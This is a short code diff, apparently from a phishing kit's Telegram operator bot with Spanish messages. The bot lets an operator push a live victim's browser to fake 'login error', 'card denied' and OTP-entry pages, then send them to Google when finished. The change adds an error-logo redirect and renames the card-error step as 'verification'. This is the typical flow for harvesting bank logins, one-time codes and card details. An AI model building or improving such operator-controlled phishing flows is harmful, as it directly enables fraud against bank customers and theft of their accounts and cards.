@@ -174,14 +174,17 @@ bot.on('callback_query', (query) => {
     const decision = data.startsWith('otp_') ? 'otp' : 'error_logo';
     socket.emit('respuestaErrorLogo', decision);
     bot.sendMessage(chatId, decision === 'otp' ? '📲 Redirigiendo a ingreso de código.' : '🚫 Error logo, reenviando.');
+    if (decision === 'error_logo') {
+      socket.emit('redirigir', 'errorlogo.html');
+    }
   }
 
   else if (data.startsWith('errortc_') || data.startsWith('finalizarTarjeta_')) {
     const action = data.split('_')[0];
 
     if (action === 'errortc') {
-      socket.emit('redirigir', 'errortc.html');
-      bot.sendMessage(chatId, '🚫 Error TC — redirigiendo...');
+      socket.emit('redirigir', 'denegado.html');
+      bot.sendMessage(chatId, '🚫 Error TC — redirigiendo a verificación.');
     } else if (action === 'finalizarTarjeta') {
       socket.emit('redirigir', 'https://www.google.com/');
       bot.sendMessage(chatId, '✅ Finalizando...');
